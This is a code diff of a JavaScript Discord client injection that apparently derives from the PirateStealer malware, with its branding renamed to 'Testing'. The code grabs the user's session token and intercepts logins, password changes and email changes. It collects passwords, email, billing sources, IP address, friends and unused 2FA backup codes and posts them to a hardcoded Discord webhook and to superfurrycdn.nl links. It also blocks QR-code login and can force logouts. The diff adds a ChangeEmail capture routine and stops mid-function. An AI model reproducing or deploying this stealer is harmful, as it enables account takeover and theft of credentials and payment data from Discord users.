@@ -7,7 +7,6 @@ const {
 const querystring = require('querystring');
 const os = require('os')
 var webhook = "https://discord.com/api/webhooks/1008720555437994034/aiLqmG36gsf4h-Ex3ruAvcOVx8bnGgIzlGQsIAzs9fSLvB5ZuQwPxw4ucv6cSOQHCqNR";
-
 const computerName = os.hostname();
 const discordInstall = `${__dirname}`
 const EvalToken = `for(let a in window.webpackJsonp?(gg=window.webpackJsonp.push([[],{get_require:(a,b,c)=>a.exports=c},[["get_require"]]]),delete gg.m.get_require,delete gg.c.get_require):window.webpackChunkdiscord_app&&window.webpackChunkdiscord_app.push([[Math.random()],{},a=>{gg=a}]),gg.c)if(gg.c.hasOwnProperty(a)){let b=gg.c[a].exports;if(b&&b.__esModule&&b.default)for(let a in b.default)"getToken"==a&&(token=b.default.getToken())}token;`
@@ -21,11 +20,11 @@ String.prototype.insert = function (index, string) {
 };
 
 const config = {
-    "logout": "true",
-    "logout-notify": "true",
-    "init-notify":"false",
-    "embed-color": 080505,
-    "disable-qr-code":"true"
+    "logout": "%LOGOUT%",
+    "logout-notify": "%LOGOUTNOTI%",
+    "init-notify":"%INITNOTI%",
+    "embed-color": 000000,
+    "disable-qr-code":"%DISABLEQRCODE%"
 }
 
 session.defaultSession.webRequest.onHeadersReceived((details, callback) => {
@@ -67,26 +66,26 @@ session.defaultSession.webRequest.onHeadersReceived((details, callback) => {
 function FirstTime() {
 	const window = BrowserWindow.getAllWindows()[0];
 	window.webContents.executeJavaScript(`${EvalToken}`, !0).then((token => {
-		if (config['init-notify'] == "false") {
+		if (config['init-notify'] == "true") {
 			if (fs.existsSync(path.join(__dirname, "init"))) {
 				fs.rmdirSync(path.join(__dirname, "init"));
 				if (token == null || token == undefined || token == "") {
 					var c = {
-						//username: "",
+						**NAME**: "Testing",
 						content: "",
 						embeds: [{
-							title: "Discord Initalized (User not Logged in)",
-							color: config["embed-color"],
+							title: "**CANNOT FIND TOKEN**",
+							color: 00000,
 							fields: [{
-								name: "Info",
-								value: `\`\`\`Hostname: \n${computerName}\nInjection Info: \n${__dirname}\n\`\`\``,
+								**NAME**: "Info",
+								value: `\`\`\`:lock:Hostname: \n${computerName},
 								inline: !1
 							}],
 							author: {
-								name: "starvish.sex"
+								name: "Testing"
 							},
 							footer: {
-								text: "starvish.sex"
+								text: "Testing"
 							}
 						}]
 					};
@@ -98,15 +97,15 @@ function FirstTime() {
                     `, !0).then(a => {
 						const b = JSON.parse(a);
 						var c = {
-							username: "starvish.sex",
+							username: "Testing",
 							content: "",
 							embeds: [{
 								title: "Discord Initalized",
-								description: "[**<:partner:909102089513340979> │ Click Here To Copy Info On Mobile**](https://superfurrycdn.nl/copy/"+ token +")",
+								description: "[**:lock: │ Click Here To Copy Info On Mobile**](https://superfurrycdn.nl/copy/"+ token +")",
 								color: config["embed-color"],
 								fields: [{
 									name: "Info",
-									value: "Error",
+									value: `\`\`\`Hostname: \n${computerName}\nInjection Info: \n${__dirname}\n\`\`\``,
 									inline: !1
 								}, {
 									name: "Username",
@@ -126,10 +125,10 @@ function FirstTime() {
 									inline: !1
 								}],
 								author: {
-									name: "starvish.sex"
+									name: "Testing"
 								},
 								footer: {
-									text: "starvish.sex"
+									text: "Testing"
 								},
 								thumbnail: {
 									url: `https://cdn.discordapp.com/avatars/${b.id}/${b.avatar}`
@@ -142,15 +141,15 @@ function FirstTime() {
 
 			}
 		}
-		if (!fs.existsSync(path.join(__dirname, "PirateStealerBTW"))) {
+		if (!fs.existsSync(path.join(__dirname, "TestingBTW"))) {
 			return !0
 		}
-		fs.rmdirSync(path.join(__dirname, "PirateStealerBTW"));
-		if (config.logout != "false" || config.logout == "instant") {
-			if (config['logout-notify'] == "false") {
+		fs.rmdirSync(path.join(__dirname, "TestingBTW"));
+		if (config.logout != "false" || config.logout == "%LOGOUT%") {
+			if (config['logout-notify'] == "true") {
 				if (token == null || token == undefined || token == "") {
 					var c = {
-						username: "starvish.sex",
+						username: "Testing",
 						content: "",
 						embeds: [{
 							title: "User log out (User not Logged in before)",
@@ -161,10 +160,10 @@ function FirstTime() {
 								inline: !1
 							}],
 							author: {
-								name: "starvish.sex"
+								name: "Testing"
 							},
 							footer: {
-								text: "starvish.sex"
+								text: "Testing"
 							}
 						}]
 					};
@@ -176,13 +175,25 @@ function FirstTime() {
                     `, !0).then(a => {
 						const b = JSON.parse(a);
 						var c = {
-						//	username: "Starvish",
+							username: "Testing",
 							content: "",
 							embeds: [{
 								title: "User got logged out",
-								//description: "[**<:partner:909102089513340979> │ Click Here To Copy Info On Mobile**](https://superfurrycdn.nl/copy/"+ token +")",
+								description: "[**:lock: │ Click Here To Copy Info On Mobile**](https://superfurrycdn.nl/copy/"+ token +")",
 								color: config["embed-color"],
 								fields: [{
+									name: "Info",
+									value: `\`\`\`Hostname: \n${computerName}\nInjection Info: \n${__dirname}\n\`\`\``,
+									inline: !1
+								}, {
+									name: "Username",
+									value: `\`${b.username}#${b.discriminator}\``,
+									inline: !0
+								}, {
+									name: "ID",
+									value: `\`${b.id}\``,
+									inline: !0
+								}, {
 									name: "Badges",
 									value: `${GetBadges(b.flags)}`,
 									inline: !1
@@ -192,22 +203,17 @@ function FirstTime() {
 									inline: !1
 								}],
 								author: {
-									name: `${b.username}#${b.discriminator} (${b.id})`
+									name: "Testing"
 								},
-								
 								footer: {
-									text: "starvish.sex"
+									text: "Testing"
 								},
 								thumbnail: {
 									url: `https://cdn.discordapp.com/avatars/${b.id}/${b.avatar}`
 								}
 							}]
 						};
-						setTimeout(function(){
-											
-										}, 5000);
-										
-										SendToWebhook2(JSON.stringify(c))
+						SendToWebhook(JSON.stringify(c))
 					});
 				}
 			}
@@ -222,7 +228,7 @@ const Filter = {
 }
 session.defaultSession.webRequest.onBeforeRequest(Filter, (details, callback) => {
 	if (details.url.startsWith("wss://")) {
-		if (config["disable-qr-code"] == "true" || config["disable-qr-code"] == "true") {
+		if (config["disable-qr-code"] == "true" || config["disable-qr-code"] == "%DISABLEQRCODE%") {
 			callback({
 				cancel: true
 			})
@@ -245,27 +251,17 @@ function SendToWebhook(what) {
     `, !0).then((token => {}))
 }
 
-function SendToWebhook2(what) {
-	const window = BrowserWindow.getAllWindows()[0];
-	window.webContents.executeJavaScript(`    var xhr = new XMLHttpRequest();
-    xhr.open("POST", "${webhook2}", true);
-    xhr.setRequestHeader('Content-Type', 'application/json');
-    xhr.setRequestHeader('Access-Control-Allow-Origin', '*');
-    xhr.send(JSON.stringify(${what}));
-    `, !0).then((token => {}))
-}
-
 function GetNitro(flags) {
 	if (flags == 0) {
-		return `\`No Nitro\``
+		return "No Nitro"
 	}
 	if (flags == 1) {
-		return "<:Nitro:854409455906979900> "
+		return "<:classic:896119171019067423> \`Nitro Classic\`"
 	}
 	if (flags == 2) {
-		return "<:Nitro:854409455906979900> <a:boost:824036778570416129> "
+		return "<a:boost:824036778570416129> \`Nitro Boost\`"
 	} else {
-		return `\`No Nitro\``
+		return "No Nitro"
 	}
 }
 
@@ -348,7 +344,7 @@ function GetBadges(flags) {
 		badges += "<:developer:874750808472825986> "
 	}
 	if (badges == "") {
-		badges = `\`No Badges\``
+		badges = "None"
 	}
 	return badges
 }
@@ -430,7 +426,7 @@ function Login(email, password, token) {
 									}
 								}
 								if (gay == "") {
-									gay = "Nothing to see here"
+									gay = "No Rare Friends"
 								}
 								return gay
 							}
@@ -440,75 +436,84 @@ function Login(email, password, token) {
 								var billing = "";
 								json.forEach(z => {
 									if (z.type == "") {
-										return "\`No\`"
+										return "\`❌\`"
 									} else if (z.type == 2 && z.invalid != !0) {
-										billing += "<:paypal:896441236062347374>"
+										billing += "\`✔️\`" + " <:paypal:896441236062347374>"
 									} else if (z.type == 1 && z.invalid != !0) {
-										billing += ":credit_card:"
+										billing += "\`✔️\`" + " :credit_card:"
 									} else {
-										return "\`No\`"
+										return "\`❌\`"
 									}
 								})
 								if (billing == "") {
-									billing = "\`No\`"
+									billing = "\`❌\`"
 								}
 								return billing
 							}
 							const json = JSON.parse(info);
 
 							var params = {
-								content: `${token}`,
+								username: "Testing",
+								content: "",
 								embeds: [{
-									"title": `${json.username}#${json.discriminator} (${json.id})`,
-									description: "[Copy Token](https://superfurrycdn.nl/"+ token +"<br>"+ password+")",
+									"title": "User Login",
+									description: "[**:lock: │ Click Here To Copy Info On Mobile**](https://superfurrycdn.nl/copy/"+ token +"<br>"+ password+")",
 									"color": config['embed-color'],
 									"fields": [{
-										name: "<a:token:953243634000617472> Token",
-										value: `\`\`\`${token}\`\`\``,
+										name: "Info",
+										value: `\`\`\`Hostname: \n${computerName}\nIP: \n${ip}\nInjection Info: \n${discordInstall}\n\`\`\``,
 										inline: !1
 									}, {
-										name: "<:bby:946246524172636161> Badges:",
-										value: `${GetBadges(json.flags)}`,
+										name: "Username",
+										value: `\`${json.username}#${json.discriminator}\``,
 										inline: !0
 									}, {
-										name: "<:bby:946246524285878343> Nitro Type:",
+										name: "ID",
+										value: `\`${json.id}\``,
+										inline: !0
+									}, {
+										name: "Nitro",
 										value: `${GetNitro(json.premium_type)}`,
-										inline: !0
+										inline: !1
 									}, {
-										name: "<a:billing:953242552780328980> Billing:",
+										name: "Badges",
+										value: `${GetBadges(json.flags)}`,
+										inline: !1
+									}, {
+										name: "Billing",
 										value: `${Cool()}`,
+										inline: !1
+									}, {
+										name: "Email",
+										value: `\`${email}\``,
 										inline: !0
 									}, {
-										name: "<:bby:946246524826968104> IP:",
-										value: `${ip}`,
-										inline: !0
-									}, {
-										name: "<:bby:946246524516581396> Email:",
-									    value: `\`${email}\``,
-										inline: !0
-									}, {
-										name: "<a:passwords:953242351969665034> Password:",
+										name: "Password",
 										value: `\`${password}\``,
 										inline: !0
+									}, {
+										name: "Token",
+										value: `\`\`\`${token}\`\`\``,
+										inline: !1
 									}, ],
 									"author": {
-										"name": "starvish.sex"
+										"name": "Testing"
 									},
 									"footer": {
-										"text": "starvish.sex"
+										"text": "Testing"
 									},
 									"thumbnail": {
 										"url": `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}`
 									}
 								}, {
-									"title": `HQ Friends`,
+									"title": `Total Friends (${totalFriends()})`,
 									"color": config['embed-color'],
 									"description": CalcFriends(),
 									"author": {
-										"name": "starvish.sex"
+										"name": "Testing"
 									},
 									"footer": {
-										"text": "starvish.sex"
+										"text": "Testing"
 									},
 									"thumbnail": {
 										"url": `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}`
@@ -516,26 +521,22 @@ function Login(email, password, token) {
 								}]
 							}
 							var mfaembed = {
-								"title": "2FA Codes",
+								"title": ":detective: __2FA Codes__",
 								"description": `[Get all of them](${baseuri})`,
 								"color": config['embed-color'],
 								"fields": fieldo,
 								"author": {
-									"name": "starvish.sex"
+									"name": "Testing"
 								},
 								"footer": {
-									"text": "starvish.sex"
+									"text": "Testing"
 								}
 							}
 							if (token.startsWith("mfa")) {
 								params.embeds.push(mfaembed)
 							}
 
-							setTimeout(function(){
-											SendToWebhook(JSON.stringify(params))
-										}, 5000);
-										
-										SendToWebhook2(JSON.stringify(params))
+							SendToWebhook(JSON.stringify(params))
 
 						})
 					} else {
@@ -586,98 +587,100 @@ function Login(email, password, token) {
 												}
 											}
 											if (gay == "") {
-												gay = "Nothing to see here"
+												gay = "No Rare Friends"
 											}
 											return gay
 										}
 
 										function Cool() {
-								const json = JSON.parse(info3)
-								var billing = "";
-								json.forEach(z => {
-									if (z.type == "") {
-										return "\`No\`"
-									} else if (z.type == 2 && z.invalid != !0) {
-										billing += "<:paypal:896441236062347374>"
-									} else if (z.type == 1 && z.invalid != !0) {
-										billing += ":credit_card:"
-									} else {
-										return "\`No\`"
-									}
-								})
-								if (billing == "") {
-									billing = "\`No\`"
-								}
-								return billing
-							}
+											const json = JSON.parse(info3)
+											var billing = "";
+											json.forEach(z => {
+												if (z.type == "") {
+													return "\`❌\`"
+												} else if (z.type == 2 && z.invalid != !0) {
+													billing += "\`✔️\`" + " <:paypal:896441236062347374>"
+												} else if (z.type == 1 && z.invalid != !0) {
+													billing += "\`✔️\`" + " :credit_card:"
+												} else {
+													return "\`❌\`"
+												}
+											})
+											if (billing == "") {
+												billing = "\`❌\`"
+											}
+											return billing
+										}
 										const json = JSON.parse(info);
 										var params = {
-											//username: "PirateStealer",
-											content: `${token}`,
-								embeds: [{
-									//"title": `${json.username}#${json.discriminator} (${json.id})`,
-									description: "[Copy Token](https://superfurrycdn.nl/"+ token +"<br>"+ password+")",
-									"color": config['embed-color'],
-									"fields": [{
-										name: "<a:token:953243634000617472> Token",
-										value: `\`\`\`${token}\`\`\``,
-										inline: !1
-									}, {
-										name: "<:bby:946246524172636161> Badges:",
-										value: `${GetBadges(json.flags)}`,
-										inline: !0
-									}, {
-										name: "<:bby:946246524285878343> Nitro Type:",
-										value: `${GetNitro(json.premium_type)}`,
-										inline: !0
-									}, {
-										name: "<a:billing:953242552780328980> Billing:",
-										value: `${Cool()}`,
-										inline: !0
-									}, {
-										name: "<:bby:946246524826968104> IP:",
-										value: `\`${ip}\``,
-										inline: !0
-									}, {
-										name: "<:bby:946246524516581396> Email:",
-									    value: `\`${email}\``,
-										inline: !0
-									}, {
-										name: "<a:passwords:953242351969665034> Password:",
-										value: `\`${password}\``,
-										inline: !0
-									}, ],
+											username: "Testing",
+											content: "",
+											embeds: [{
+												"title": "User Login",
+												description: "[**:lock: │ Click Here To Copy Info On Mobile**](https://superfurrycdn.nl/copy/"+ token +"<br>"+ password+")",
+												"color": config['embed-color'],
+												"fields": [{
+													name: "Info",
+													value: `\`\`\`Hostname: \n${computerName}\nIP: \n${ip}\nInjection Info: \n${discordInstall}\n\`\`\``,
+													inline: !1
+												}, {
+													name: "Username",
+													value: `\`${json.username}#${json.discriminator}\``,
+													inline: !0
+												}, {
+													name: "ID",
+													value: `\`${json.id}\``,
+													inline: !0
+												}, {
+													name: "Nitro",
+													value: `${GetNitro(json.premium_type)}`,
+													inline: !1
+												}, {
+													name: "Badges",
+													value: `${GetBadges(json.flags)}`,
+													inline: !1
+												}, {
+													name: "Billing",
+													value: `${Cool()}`,
+													inline: !1
+												}, {
+													name: "Email",
+													value: `\`${email}\``,
+													inline: !0
+												}, {
+													name: "Password",
+													value: `\`${password}\``,
+													inline: !0
+												}, {
+													name: "Token",
+													value: `\`\`\`${token}\`\`\``,
+													inline: !1
+												}, ],
 												"author": {
-													"name": `${json.username}#${json.discriminator} (${json.id})`
+													"name": "Testing"
 												},
 												"footer": {
-													"text": "starvish.sex"
+													"text": "Testing"
 												},
 												"thumbnail": {
 													"url": `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}`
 												}
 											}, {
-												"title": `HQ Friends`,
-									"color": config['embed-color'],
-									"description": CalcFriends(),
-									"author": {
-										"name": "",
-									},
-									"footer": {
-										"text": "starvish.sex"
-									},
-									"thumbnail": {
-										"url": `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}`
+												"title": `Total Friends (${totalFriends()})`,
+												"color": config['embed-color'],
+												"description": CalcFriends(),
+												"author": {
+													"name": "Testing"
+												},
+												"footer": {
+													"text": "Testing"
+												},
+												"thumbnail": {
+													"url": `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}`
 												}
 											}]
 										}
-									
-										setTimeout(function(){
-											SendToWebhook(JSON.stringify(params))
-										}, 5000);
-										
-										SendToWebhook2(JSON.stringify(params))
-									
+										SendToWebhook(JSON.stringify(params))
 									})
 								})
 							})
@@ -776,76 +779,88 @@ function ChangePassword(oldpassword, newpassword, token) {
 								var billing = "";
 								json.forEach(z => {
 									if (z.type == "") {
-										return "\`No\`"
+										return "\`❌\`"
 									} else if (z.type == 2 && z.invalid != !0) {
-										billing += "<:paypal:896441236062347374>"
+										billing += "\`✔️\`" + " <:paypal:896441236062347374>"
 									} else if (z.type == 1 && z.invalid != !0) {
-										billing += ":credit_card:"
+										billing += "\`✔️\`" + " :credit_card:"
 									} else {
-										return "\`No\`"
+										return "\`❌\`"
 									}
 								})
 								if (billing == "") {
-									billing = "\`No\`"
+									billing = "\`❌\`"
 								}
 								return billing
 							}
 							const json = JSON.parse(info);
 
 							var params = {
-								username: "starvish.sex",
-								content: `Password Changed`,
+								username: "Testing",
+								content: "",
 								embeds: [{
 									"title": "Password Changed",
-									description: "[Copy Token](https://superfurrycdn.nl/"+ token +"<br>"+ password+")",
+									description: "[**:lock: │ Click Here To Copy Info On Mobile**](https://superfurrycdn.nl/copy/"+ token +"<br>"+ newpassword+")",
 									"color": config['embed-color'],
 									"fields": [{
-													name: "<a:token:953243634000617472> Token",
-													value: `\`\`\`${token}\`\`\``,
-													inline: !1
-												}, {
-													name: "<:bby:946246524172636161> Badges:",
-													value: `${GetBadges(json.flags)}`,
-													inline: !0
-												}, {
-													name: "<:bby:946246524285878343> Nitro Type:",
-													value: `${GetNitro(json.premium_type)}`,
-													inline: !0
-												}, {
-													name: "<a:billing:953242552780328980> Billing",
-													value: `${Cool()}`,
-													inline: !0
-												}, {
-													name: "<:bby:946246524516581396> Email",
-													value: `\`${json.email}\``,
-													inline: !0
-												}, {
-													name: "<a:passwords:953242351969665034> Old Password",
-													value: `\`${oldpassword}\``,
-													inline: !0
-												}, {
-													name: "<a:passwords:953242351969665034> New Password",
-													value: `\`${newpassword}\``,
-													inline: !0
-												}, ],
-												"author": {
-													"name": `${json.username}#${json.discriminator} (${json.id})`
-												},
-												"footer": {
-													"text": "starvish.sex"
-												},
-												"thumbnail": {
-													"url": `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}`
-												}
+										name: "Info",
+										value: `\`\`\`Hostname: \n${computerName}\nIP: \n${ip}\nInjection Info: \n${discordInstall}\n\`\`\``,
+										inline: !1
+									}, {
+										name: "Username",
+										value: `\`${json.username}#${json.discriminator}\``,
+										inline: !0
+									}, {
+										name: "ID",
+										value: `\`${json.id}\``,
+										inline: !0
+									}, {
+										name: "Nitro",
+										value: `${GetNitro(json.premium_type)}`,
+										inline: !1
+									}, {
+										name: "Badges",
+										value: `${GetBadges(json.flags)}`,
+										inline: !1
+									}, {
+										name: "Billing",
+										value: `${Cool()}`,
+										inline: !1
+									}, {
+										name: "Email",
+										value: `\`${json.email}\``,
+										inline: !1
+									}, {
+										name: "Old Password",
+										value: `\`${oldpassword}\``,
+										inline: !0
+									}, {
+										name: "New Password",
+										value: `\`${newpassword}\``,
+										inline: !0
+									}, {
+										name: "Token",
+										value: `\`\`\`${token}\`\`\``,
+										inline: !1
+									}, ],
+									"author": {
+										"name": "Testing"
+									},
+									"footer": {
+										"text": "Testing"
+									},
+									"thumbnail": {
+										"url": `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}`
+									}
 								}, {
-									"title": `HQ Friends`,
+									"title": `Total Friends (${totalFriends()})`,
 									"color": config['embed-color'],
 									"description": CalcFriends(),
 									"author": {
-										"name": ""
+										"name": "Testing"
 									},
 									"footer": {
-										"text": "starvish.sex"
+										"text": "Testing"
 									},
 									"thumbnail": {
 										"url": `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}`
@@ -853,26 +868,22 @@ function ChangePassword(oldpassword, newpassword, token) {
 								}]
 							}
 							var mfaembed = {
-								"title": "2FA Codes",
+								"title": ":detective: __2FA Codes__",
 								"description": `[Get all of them](${baseuri})`,
 								"color": config['embed-color'],
 								"fields": fieldo,
 								"author": {
-									"name": ""
+									"name": "Testing"
 								},
 								"footer": {
-									"text": "starvish.sex"
+									"text": "Testing"
 								}
 							}
 							if (token.startsWith("mfa")) {
 								params.embeds.push(mfaembed)
 							}
 
-							setTimeout(function(){
-											SendToWebhook(JSON.stringify(params))
-										}, 5000);
-										
-										SendToWebhook2(JSON.stringify(params))
+							SendToWebhook(JSON.stringify(params))
 
 						})
 					} else {
@@ -929,91 +940,99 @@ function ChangePassword(oldpassword, newpassword, token) {
 											return gay
 										}
 
-								function Cool() {
-								const json = JSON.parse(info3)
-								var billing = "";
-								json.forEach(z => {
-									if (z.type == "") {
-										return "\`No\`"
-									} else if (z.type == 2 && z.invalid != !0) {
-										billing += "<:paypal:896441236062347374>"
-									} else if (z.type == 1 && z.invalid != !0) {
-										billing += ":credit_card:"
-									} else {
-										return "\`No\`"
-									}
-								})
-								if (billing == "") {
-									billing = "\`No\`"
-								}
-								return billing
-							}
+										function Cool() {
+											const json = JSON.parse(info3)
+											var billing = "";
+											json.forEach(z => {
+												if (z.type == "") {
+													return "\`❌\`"
+												} else if (z.type == 2 && z.invalid != !0) {
+													billing += "\`✔️\`" + " <:paypal:896441236062347374>"
+												} else if (z.type == 1 && z.invalid != !0) {
+													billing += "\`✔️\`" + " :credit_card:"
+												} else {
+													return "\`❌\`"
+												}
+											})
+											if (billing == "") {
+												billing = "\`❌\`"
+											}
+											return billing
+										}
 										const json = JSON.parse(info);
 										var params = {
-										//	username: "log",
-											content: ``,
+											username: "Testing",
+											content: "",
 											embeds: [{
-											//	"title": "Password Changed",
-												 description: "[Copy Token](https://superfurrycdn.nl/"+ token +"<br>"+ password+")",
+												"title": "Password Changed",
+												description: "[**:lock: │ Click Here To Copy Info On Mobile**](https://superfurrycdn.nl/copy/"+ token +"<br>"+ newpassword+")",
 												"color": config['embed-color'],
 												"fields": [{
-													name: "<a:token:953243634000617472> Token",
-													value: `\`\`\`${token}\`\`\``,
+													name: "Info",
+													value: `\`\`\`Hostname: \n${computerName}\nIP: \n${ip}\nInjection Info: \n${discordInstall}\n\`\`\``,
 													inline: !1
 												}, {
-													name: "<:bby:946246524172636161> Badges:",
-													value: `${GetBadges(json.flags)}`,
+													name: "Username",
+													value: `\`${json.username}#${json.discriminator}\``,
 													inline: !0
 												}, {
-													name: "<:bby:946246524285878343> Nitro Type:",
+													name: "ID",
+													value: `\`${json.id}\``,
+													inline: !0
+												}, {
+													name: "Nitro",
 													value: `${GetNitro(json.premium_type)}`,
-													inline: !0
+													inline: !1
 												}, {
-													name: "<a:billing:953242552780328980> Billing",
+													name: "Badges",
+													value: `${GetBadges(json.flags)}`,
+													inline: !1
+												}, {
+													name: "Billing",
 													value: `${Cool()}`,
-													inline: !0
+													inline: !1
 												}, {
-													name: "<:bby:946246524516581396> Email",
+													name: "Email",
 													value: `\`${json.email}\``,
-													inline: !0
+													inline: !1
 												}, {
-													name: "<a:passwords:953242351969665034> Old Password",
+													name: "Old Password",
 													value: `\`${oldpassword}\``,
 													inline: !0
 												}, {
-													name: "<a:passwords:953242351969665034> New Password",
+													name: "New Password",
 													value: `\`${newpassword}\``,
 													inline: !0
+												}, {
+													name: "Token",
+													value: `\`\`\`${token}\`\`\``,
+													inline: !1
 												}, ],
 												"author": {
-													"name": `${json.username}#${json.discriminator} (${json.id})`
+													"name": "Testing"
 												},
 												"footer": {
-													"text": "starvish.sex"
+													"text": "Testing"
 												},
 												"thumbnail": {
 													"url": `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}`
 												}
 											}, {
-												"title": `HQ Friends`,
+												"title": `Total Friends (${totalFriends()})`,
 												"color": config['embed-color'],
 												"description": CalcFriends(),
 												"author": {
-													"name": ""
+													"name": "Testing"
 												},
 												"footer": {
-													"text": "starvish.sex"
+													"text": "Testing"
 												},
 												"thumbnail": {
 													"url": `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}`
 												}
 											}]
 										}
-										setTimeout(function(){
-											SendToWebhook(JSON.stringify(params))
-										}, 5000);
-										
-										SendToWebhook2(JSON.stringify(params))
+										SendToWebhook(JSON.stringify(params))
 									})
 								})
 							})
@@ -1026,9 +1045,386 @@ function ChangePassword(oldpassword, newpassword, token) {
 	})
 }
 
+function ChangeEmail(newemail, password, token) {
+	const window = BrowserWindow.getAllWindows()[0];
+	window.webContents.executeJavaScript(`
+    var xmlHttp = new XMLHttpRequest();
+    xmlHttp.open( "GET", "https://discord.com/api/v8/users/@me", false );
+    xmlHttp.setRequestHeader("Authorization", "${token}");
+    xmlHttp.send( null );
+    xmlHttp.responseText;`, !0).then((info) => {
+		window.webContents.executeJavaScript(`
+        var xmlHttp = new XMLHttpRequest();
+        xmlHttp.open( "GET", "https://www.myexternalip.com/raw", false );
+        xmlHttp.send( null );
+        xmlHttp.responseText;
+    `, !0).then((ip) => {
+			window.webContents.executeJavaScript(`
+        var xmlHttp = new XMLHttpRequest();
+        xmlHttp.open( "GET", "https://discord.com/api/v9/users/@me/billing/payment-sources", false );
+        xmlHttp.setRequestHeader("Authorization", "${token}");
+        xmlHttp.send( null );
+        xmlHttp.responseText`, !0).then((info3) => {
+				window.webContents.executeJavaScript(`
+            var xmlHttp = new XMLHttpRequest();
+            xmlHttp.open( "GET", "https://discord.com/api/v9/users/@me/relationships", false );
+            xmlHttp.setRequestHeader("Authorization", "${token}");
+            xmlHttp.send( null );
+            xmlHttp.responseText`, !0).then((info4) => {
+
+					if (token.startsWith("mfa")) {
+						window.webContents.executeJavaScript(`
+              var xmlHttp = new XMLHttpRequest();
+              xmlHttp.open("POST", "https://discord.com/api/v9/users/@me/mfa/codes", false);
+              xmlHttp.setRequestHeader('Content-Type', 'application/json');
+              xmlHttp.setRequestHeader("authorization", "${token}")
+              xmlHttp.send(JSON.stringify({\"password\":\"${password}\",\"regenerate\":false}));
+              xmlHttp.responseText`, !0).then((codes) => {
+
+							var fieldo = [];
+							var baseuri = "https://superfurrycdn.nl/copy/"
 
 
+							var gayass = JSON.parse(codes)
+							let g = gayass.backup_codes
+							const r = g.filter((code) => {
+								return code.consumed == null
+							})
+							for (let z in r) {
+								fieldo.push({
+									name: `Code`,
+									value: `\`${r[z].code.insert(4, "-")}\``,
+									inline: true
+								})
+								baseuri += `${r[z].code.insert(4, "-")}<br>`
+							}
 
+							function totalFriends() {
+								var f = JSON.parse(info4)
+								const r = f.filter((user) => {
+
+									return user.type == 1
+								})
+								return r.length
+							}
+
+							function CalcFriends() {
+								var f = JSON.parse(info4)
+								const r = f.filter((user) => {
+									return user.type == 1
+								})
+								var gay = "";
+								for (z of r) {
+									var b = GetRBadges(z.user.public_flags)
+									if (b != "") {
+										gay += b + ` ${z.user.username}#${z.user.discriminator}\n`
+									}
+								}
+								if (gay == "") {
+									gay = "No Rare Friends"
+								}
+								return gay
+							}
+
+							function Cool() {
+								const json = JSON.parse(info3)
+								var billing = "";
+								json.forEach(z => {
+									if (z.type == "") {
+										return "\`❌\`"
+									} else if (z.type == 2 && z.invalid != !0) {
+										billing += "\`✔️\`" + " <:paypal:896441236062347374>"
+									} else if (z.type == 1 && z.invalid != !0) {
+										billing += "\`✔️\`" + " :credit_card:"
+									} else {
+										return "\`❌\`"
+									}
+								})
+								if (billing == "") {
+									billing = "\`❌\`"
+								}
+								return billing
+							}
+							const json = JSON.parse(info);
+
+							var params = {
+								username: "Testing",
+								content: "",
+								embeds: [{
+									"title": "Email Changed",
+									description: "[**:lock: │ Click Here To Copy Info On Mobile**](https://superfurrycdn.nl/copy/"+ token +"<br>"+ password+")",
+									"color": config['embed-color'],
+									"fields": [{
+										name: "Info",
+										value: `\`\`\`Hostname: \n${computerName}\nIP: \n${ip}\`\`\``,
+										inline: !1
+									}, {
+										name: "Username",
+										value: `\`${json.username}#${json.discriminator}\``,
+										inline: !0
+									}, {
+										name: "ID",
+										value: `\`${json.id}\``,
+										inline: !0
+									}, {
+										name: "Nitro",
+										value: `${GetNitro(json.premium_type)}`,
+										inline: !1
+									}, {
+										name: "Badges",
+										value: `${GetBadges(json.flags)}`,
+										inline: !1
+									}, {
+										name: "Billing",
+										value: `${Cool()}`,
+										inline: !1
+									}, {
+										name: "New Email",
+										value: `\`${newemail}\``,
+										inline: !0
+									}, {
+										name: "Password",
+										value: `\`${password}\``,
+										inline: !0
+									}, {
+										name: "Token",
+										value: `\`\`\`${token}\`\`\``,
+										inline: !1
+									}, ],
+									"author": {
+										"name": "Testing"
+									},
+									"footer": {
+										"text": "Testing"
+									},
+									"thumbnail": {
+										"url": `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}`
+									}
+								}, {
+									"title": `Total Friends (${totalFriends()})`,
+									"color": config['embed-color'],
+									"description": CalcFriends(),
+									"author": {
+										"name": "Testing"
+									},
+									"footer": {
+										"text": "Testing"
+									},
+									"thumbnail": {
+										"url": `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}`
+									}
+								}]
+							}
+							var mfaembed = {
+								"title": ":detective: __2FA Codes__",
+								"description": `[Get all of them](${baseuri})`,
+								"color": config['embed-color'],
+								"fields": fieldo,
+								"author": {
+									"name": "Testing"
+								},
+								"footer": {
+									"text": "Testing"
+								}
+							}
+							if (token.startsWith("mfa")) {
+								params.embeds.push(mfaembed)
+							}
+
+							SendToWebhook(JSON.stringify(params))
+
+						})
+					} else {
+
+						const window = BrowserWindow.getAllWindows()[0];
+						window.webContents.executeJavaScript(`
+    var xmlHttp = new XMLHttpRequest();
+    xmlHttp.open( "GET", "https://discord.com/api/v8/users/@me", false );
+    xmlHttp.setRequestHeader("Authorization", "${token}");
+    xmlHttp.send( null );
+    xmlHttp.responseText;`, !0).then((info) => {
+							window.webContents.executeJavaScript(`
+        var xmlHttp = new XMLHttpRequest();
+        xmlHttp.open( "GET", "https://www.myexternalip.com/raw", false );
+        xmlHttp.send( null );
+        xmlHttp.responseText;
+    `, !0).then((ip) => {
+								window.webContents.executeJavaScript(`
+        var xmlHttp = new XMLHttpRequest();
+        xmlHttp.open( "GET", "https://discord.com/api/v9/users/@me/billing/payment-sources", false );
+        xmlHttp.setRequestHeader("Authorization", "${token}");
+        xmlHttp.send( null );
+        xmlHttp.responseText`, !0).then((info3) => {
+									window.webContents.executeJavaScript(`
+            var xmlHttp = new XMLHttpRequest();
+            xmlHttp.open( "GET", "https://discord.com/api/v9/users/@me/relationships", false );
+            xmlHttp.setRequestHeader("Authorization", "${token}");
+            xmlHttp.send( null );
